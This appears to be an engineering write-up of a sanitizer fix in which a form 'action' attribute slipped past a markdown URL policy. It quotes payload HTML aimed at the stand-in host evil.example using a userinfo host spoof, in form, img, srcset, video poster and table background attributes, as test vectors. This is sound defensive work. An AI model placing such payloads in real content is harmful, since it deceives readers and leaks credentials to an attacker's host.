# C-4 — `<form action>` bypassed the sink that F-1 closed

2026-07-29. Branch `hardening/markdown-href`, clone `/workspace/farmtable-mdhref`.
Raised by `review-markdown-href` on the re-gate of `b634c602`, which confirmed
F-1 as written is closed at `markdown.ts:126` and then found this beside it.

## The defect, reproduced before it was believed

```
<form action="https://github.com@evil.example/"><button>View pull request #482</button></form>
```

One submit control. No `method`, so GET. Clicking it contacts `evil.example` and
hands it the userinfo `github.com:`, with the button's own label chosen by the
same author who chose the address. That is **F-1's own impact sentence at F-1's
own sink** — reads as one host, contacts another, leaks credentials on click —
and it walked past the URL policy untouched.

Measured on a faithful replica of the shipped pipeline before anything changed
(`/workspace/mdhref-rig/measure-form-action.mjs`), with the hook as it stood at
`b634c602`:

```
SURVIVES  form action              <form action="https://github.com@evil.example/">…
SURVIVES  form action, method=post
refused   input formaction         <form><input type="submit"></form>
refused   button formaction        <form><button>Go</button></form>
refused   a href (control)         <p><a>x</a></p>
```

## Why it got through, and what it was NOT

**The predicate was never wrong.** `isPermitted` returns the correct answer for
`https://github.com@evil.example/` and always did — it is refused at
`markdown.ts:126` on userinfo, exactly like the `href` form of the same URL. The
hook simply never asked it, because `LINK_ATTRS` did not contain `action`.

So C-4 is not a second parser, not a carve-out, and not a policy gap. **It is an
enumeration that fell behind the thing it enumerates.** The fix is one array
entry. Anything larger would be redesigning a component that measured correct.

The failure that let it sit there is in the prose, and it is worth more than the
fix. The docblock at the list said:

> NOT MEASURED: whether any further attribute permitted by a **future**
> DOMPurify default navigates.

Every word true, and the tense wrong. `action` was permitted **then**, navigated
**then**, and was absent from the list **then**. A reader checking whether the
list was complete would have read that sentence as "a risk about later versions"
and stopped — the sentence routed them past a live hole while sounding careful.
**A present-tense gap written in the future tense is worse than no disclosure,
because it consumes the attention that would have found it.** It is now stated
in the present tense, and it says plainly that nothing reconciles this list
against DOMPurify's allowed-attribute set today.

## What landed

| | |
|---|---|
| `markdown.ts:54` | `LINK_ATTRS = ['href', 'xlink:href', 'action']` — one entry |
| `markdown.ts:38-53` | the list's docblock: why `action`, the measured `formaction` negative, and the gap restated in the present tense |
| `markdown.ts:215-236` | scope paragraph: names all three attributes, and corrects the accepted-risk count (below) |
| `markdown-href.test.ts` | `testFormActionIsPoliced`, pinned, both polarities |

`url-binding-scan.test.ts` is untouched, as instructed — it has zero changes
across `89a974da..b634c602` and stays that way.

### RED before GREEN

Written before the array entry, against `b634c602`:

```
Error: a credential-bearing form action survived
  (got https://github.com@evil.example/, want null)
  at testFormActionIsPoliced (markdown-href.test.js:510:5)
not ok 4 - web/.tmp-test/util/markdown-href.test.js
```

GREEN after, with the arm carrying four rows so it cannot pass by accident:
the GET vector refused; the POST vector refused (the URL policy makes no
distinction between methods and neither may the arm); an ordinary
`https://example.com/search` action KEPT; a same-origin `/tasks/search` action
KEPT. Plus the Option B row — the button's label survives the refusal, because
removing the `action` must not remove the control's own text.

`formaction` is deliberately **not** pinned. DOMPurify's defaults strip it before
any hook runs, measured on this version; pinning somebody else's behaviour as if
it were ours makes a guard look wider than its evidence. It is recorded in the
docblock instead, with the consequence: if `formaction` ever survives an upgrade,
it belongs in the list.

## R-2 — the accepted risk was sized at one attribute and it is four

Separate from C-4, prose only, and **the `src` ruling is not re-litigated**. The
scope paragraph named `src` alone as the credential leak that is knowingly not
guarded. Measured on the same replica, all four survive with credentials intact
and all four fetch **on render, with no click at all**:

| attribute | measured survivor |
|---|---|
| `src` | `<img src="https://github.com@evil.example/x.png">` |
| `srcset` | `<img srcset="https://github.com@evil.example/x.png 1x">` |
| `poster` | `<video poster="https://github.com@evil.example/p.png">` |
| `background` | `<table background=…>` **and** `<td background=…>`, both kept |

The ruling stands and no guard was added. Only the count changed: **a disclosure
that understates its own scope is not a disclosure**, and whoever revisits the
`src` decision is revisiting four attributes, not one.

## The general shape, since this is the second time tonight

C-1/C-2/C-3 were a bespoke parser that was weaker than the function it carved
around. C-4 is a list that was shorter than the attribute set it filtered.
**Both are the same failure at different sizes: a local restatement of a fact
that lives somewhere else.** The predicate was fixed by deleting the restatement
and asking the platform. The list cannot be fixed that way today — nothing walks
DOMPurify's allowed-attribute set and asserts that nothing navigable is missing
here. That reconciliation is the durable fix and IT IS NOT BUILT; until it is,
every DOMPurify upgrade silently re-opens this question and no gate will say so.
Filed, not closed, and stated in the code rather than only here.

## Gates, re-run

| gate | result |
|---|---|
| `npm test` | 7 files, 7 pass, 0 fail |
| `go build ./...` | exit 0 |
| `go vet ./...` | exit 0 |
| `go test ./...` | 11 ok, 0 FAIL |
| `node scripts/ci-suite-manifest.mjs` | exit 0 — `enumerated=7 executed=7 missing=0 (floor 7)`, surplus=0, required=4 |
| fixtures | `cases=45 divergent=13 base_dependent=6`, suite floor 7 |

Nothing pushed; `main` unmoved at `7bb0c756`.
